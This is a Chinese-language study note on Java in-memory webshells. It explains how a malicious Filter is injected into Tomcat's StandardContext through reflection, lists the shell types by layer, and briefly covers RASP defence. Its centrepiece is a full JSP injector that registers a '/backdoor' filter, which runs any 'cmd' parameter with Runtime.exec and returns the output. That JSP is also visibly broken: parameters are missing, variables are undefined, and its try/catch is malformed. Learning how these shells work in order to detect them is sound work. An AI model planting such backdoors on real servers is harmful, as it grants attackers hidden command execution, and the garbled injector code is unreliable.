---
title: Java 内存马基础
description: 内存马的核心概念与传统 Webshell 的对比、Java 内存马注入的核心原理与通用流程、Filter 型内存马完整 Demo（含 StandardContext 获取、FilterDef/FilterMap 注册）、内存马分类及 RASP 防御策略
tags: [内存马, 无文件马, Filter, Tomcat, StandardContext, RASP, Webshell, Java安全]
status: 已完成
finish-date: 2026-07-10
difficulty: 中等
---

# 内存马
>内存马，也被称为"无文件马"，是一种仅存在于计算机内存中、不在硬盘上写入任何恶意文件的木马程序。
>
>核心思想是落地无声，通过合法的应用进程执行恶意代码，从而躲避传统基于文件扫描的杀毒软件和Webshell检测工具的查杀。

## 传统Webshell与内存马的对比
>传统Webshell（如一句话木马）需要将恶意脚本文件上传到服务器，这种方式很容易被防火墙、IDS、杀毒软件等安全设备发现和查杀。而内存马将恶意代码直接注入到Web应用的内存中，没有文件落地，使得传统的文件监控和扫描手段失效，隐蔽性极高

**传统Webshell**：以文件形式存在于服务器文件系统中，如`shell.jsp`。该文件本身就是后门，若被管理员删除，则后门失效。

**内存马**：以JSP文件作为注入器，执行注入代码后将真正的后门组件（恶意Filter/Servlet/Listener）注入到Tomcat的内存中。注入完成后，可将注入器文件删除，后门组件依然驻留内存，直至应用重启。

## Java内存马注入的核心原理
>在Web请求的处理过程中（请求会依次经过Listener（监听器）、Filter（过滤器）、Servlet等组件），攻击者通过漏洞动态地注册一个新的恶意组件，或修改已有组件的逻辑，从而植入后门代码

## 注入流程

>以最常见的 Filter型内存马为例，其注入流程可以理解为：

- 获取上下文（Context）：内存马注入的核心操作是获取`StandardContext`实例，然后向其注册恶意组件。通过反射等技术，获取当前Web应用的核心上下文对象（如Tomcat的StandardContext），这是进行动态注册的"操作台"。
获取`StandardContext`的通用路径如下：

1. 从当前请求对象获取`ServletContext`

2. 反射获取`ServletContext`中的`context`字段，得到`ApplicationContext`

3. 反射获取`ApplicationContext`中的`context`字段，得到`StandardContext`

- 封装恶意Filter：创建一个实现了恶意逻辑的Filter类，并将其封装成FilterDef对象（包含Filter名、类定义等）。

- 创建Filter配置：创建FilterMap对象，将我们的恶意Filter与一个特定的URL路径（如/shell/*）绑定起来。

- 动态注册：将封装好的FilterDef和FilterMap添加到之前获取的StandardContext中，并更新FilterConfigs，让Web应用在处理请求时就能调用到我们的恶意Filter。

完成以上步骤后，只要攻击者访问特定的路径，恶意Filter就会在内存中拦截请求并执行攻击代码，而这一切在服务器上都不会留下任何文件

## 如何防御内存马

>由于内存马"无文件"的特性，传统的文件扫描工具基本失效。现代防御主要依赖RASP（运行时应用自我保护）技术。

- RASP的防御原理：RASP像一个"免疫系统"，直接嵌入到应用程序内部，通过Hook（钩子）关键函数，实时监测应用运行时的行为。

- 防御策略：它可以从两个维度进行防御：

    - 拦截注入过程：监控并阻断通过表达式执行、反序列化等漏洞注入内存马的行为，让马根本"种"不进去。

    - 拦截执行过程：如果内存马已被注入，RASP能通过分析其执行时的异常行为（如执行系统命令、读写敏感文件）来进行阻断，即使马在内存中，攻击者也无法利用它。


## 内存马类型
```
【内存马技术栈】
        │
        ├── Ⅰ. 容器层（Web容器/应用服务器）
        │       │
        │       ├── ✅ Filter 型
        │       │   └── 寄生位置: Tomcat StandardContext (FilterChain)
        │       │
        │       ├── ✅ Listener 型
        │       │   └── 寄生位置: Tomcat StandardContext (事件监听列表)
        │       │
        │       └── ✅ Servlet 型
        │           └── 寄生位置: Tomcat StandardContext (Wrapper组件)
        │
        ├── Ⅱ. 框架层（Spring / Spring Boot）
        │       │
        │       ├── ✅ Spring Controller 型
        │       │   └── 寄生位置: RequestMappingHandlerMapping (路由映射表)
        │       │
        │       └── ✅ Spring Interceptor 型
        │           └── 寄生位置: InterceptorRegistry (拦截器注册表)
        │
        └── Ⅲ. JVM层（Java虚拟机底层）
                │
                ├── ✅ Agent 型
                │   └── 寄生位置: 已加载类的字节码 (通过 Instrumentation API)
                │
                └── ✅ Thread 型
                    └── 寄生位置: JVM 运行时数据区 (独立/劫持线程栈)
```

## 以Filter型为例编写内存马demo
### 关键步骤
```
1. 拿到"操作台"（Context）
2. 创建"武器"（恶意组件）
3. 注册到操作台（绑定触发条件）
```
### 理解关键组件

**StandardContext（操作台）**

>想象Tomcat是一个工厂，StandardContext就是工厂的总控制台。所有Servlet、Filter、Listener都在这里注册

```jsp
StandardContext standardContext = null;
try {
    // 从线程上下文获取
    ClassLoader cl = Thread.currentThread().getContextClassLoader();
    Field resourcesField = cl.getClass().getDeclaredField("resources");
    resourcesField.setAccessible(true);
    Object resources = resourcesField.get(cl);
    Field contextField = resources.getClass().getDeclaredField("context");
    contextField.setAccessible(true);
    standardContext = (StandardContext) contextField.get(resources);
} catch (Exception e) {
    out.println("获取StandardContext失败：" + e);
    return;
}
```
*详解*
- StandardContext standardContext = null;	声明变量，初始为空	

- ClassLoader cl = Thread.currentThread().getContextClassLoader();   获取当前线程的类加载器

- Field resourcesField = cl.getClass().getDeclaredField("resources");	通过反射获取类加载器的resources字段

- resourcesField.setAccessible(true);	设置为可访问（突破private限制）	

- Object resources = resourcesField.get(cl);	获取resources字段的值

- Field contextField = resources.getClass().getDeclaredField("context");	通过反射获取resources对象的context字段

- standardContext = (StandardContext) contextField.get(resources);	获取context字段的值，并强制转换为StandardContext

*Tomcat内部的对象层次结构*

```
当前线程
  └── 上下文类加载器 (WebappClassLoader)
        └── resources 字段 (WebResourceRoot)
              └── context 字段 (StandardContext) ← 我们要的就是这个！
```

*为什么不用request.getServletContext()？*
```java
// 这样写更简单，但拿到的不是StandardContext
ServletContext ctx = request.getServletContext();  // 这个是标准接口
// 我们需要的是Tomcat特有的StandardContext，里面有registerFilter方法
```
request.getServletContext() 拿到的是规范的接口，没有注册Filter的方法。我们需要的是Tomcat的具体实现类StandardContext。

**Filter（过滤器）**

>Filter就像工厂里的质检员。每个请求进来都要经过质检员检查：

```java
// 这就是一个"质检员"的模板
public class MyFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        // 在这里写你的"检查逻辑"
        // 如果发现可疑（比如有cmd参数），就拦截！
        // 否则放行（chain.doFilter）
    }
}
```
**FilterDef（包装盒）**

>要把质检员挂到控制台，得先把它装进一个包装盒

```java
// 给质检员贴上标签（名字），装进盒子
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("我的质检员");
filterDef.setFilter(evilFilter);  // 把质检员放进去

```

**FilterMap（说明书）**

>告诉控制台："当XXX请求进来时，找我的质检员"：

```java
// 使用说明书："/shell"路径 → "我的质检员"
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("我的质检员");
filterMap.addURLPattern("/shell");
```

### 组装组件
```jsp
// 1. 拿到操作台
StandardContext standardContext = getStandardContext();

// 2. 创建质检员
EvilFilter evilFilter = new EvilFilter();

// 3. 装进包装盒
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("EvilFilter");
filterDef.setFilter(evilFilter);
standardContext.addFilterDef(filterDef);

// 4. 写使用说明书
FilterMap filterMap = new FilterMap();
filterMap.setFilterName("EvilFilter");
filterMap.addURLPattern("/shell");
standardContext.addFilterMapBefore(filterMap);

```

### 完整注入器
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.*" %>
<% class MyFilter implements Filter{
    public void doFilter() throws Exception{
        String cmd=req.getParameter("cmd");
        if(cmd!=null){
            PrintWriter out=res.getWriter();
            try{
                Process p=Runtime.getRuntime().exec(cmd);
                BufferedReader reader=new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while(line=reader.readLine() !=null){
                    out.println(line);
                }catch(Exception e){
                    out.println(e);
                }
            }
            out.flush();
            return;
        }
        chain.doFilter(req,res);
    }

    StandardContext ct=null;
    try{
         ClassLoader cl=Thread.currentThread().getContextClassLoader();
        Field resourceField =cl.getClass().getDeclaredField("resources");
        resourceField.setAccessible(true);
        Object resource=resourceField.get(cl);
        Field contextField=resource.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ct=(StandardContext)contextField.get(resource);
    }catch(Exception e){
        out.println(e);
        return;
    }
   

    MyFilter mf =new MyFilter();
    FilterDef mfd=new FilterDef();
    mfd.setFilterName("mybackdoor");
    mfd.setFilter(mf);
    ct.addFilterDef(mfd);
    FilterMap mfm=new FilterMap();
    mfm.setFilterName("mybackdoor");
    mfm.addURLPattern("/backdoor");
    ct.addFilterMapBefore(mfm);

}
%>
```

### 完整执行流程模拟
```
1. 浏览器访问
   ↓
2. Tomcat接收请求：/backdoor?cmd=whoami
   ↓
3. 查找FilterMap：发现 /backdoor 绑定了 "MyBackdoor"
   ↓
4. 执行MyBackdoor的doFilter()方法
   ↓
5. 获取cmd参数 = "whoami"
   ↓
6. 执行命令：Runtime.getRuntime().exec("whoami")
   ↓
7. 读取命令输出："root"
   ↓
8. 返回给浏览器："root"
   ↓
9. return（拦截请求，不再继续传递）
```